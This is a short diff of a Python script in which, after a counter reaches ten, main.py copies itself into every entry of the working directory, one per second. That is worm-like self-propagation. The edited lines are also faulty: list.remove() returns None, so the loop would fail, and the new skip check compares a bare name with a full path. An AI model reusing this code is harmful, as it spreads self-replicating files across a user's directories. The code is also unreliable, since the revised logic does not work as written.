@@ -12,9 +12,9 @@ while count < 10:
     count += 1
     
 if count == 10:
-    all = os.listdir(cwd)
+    all = os.listdir(cwd).remove("main.py")
     for dir in all:
-        if dir == cwd: pass
+        if dir == f"{cwd}{sep}main.py": pass
         else:
             time.sleep(1)
             shutil.copy(f"{cwd}{sep}main.py", dir)
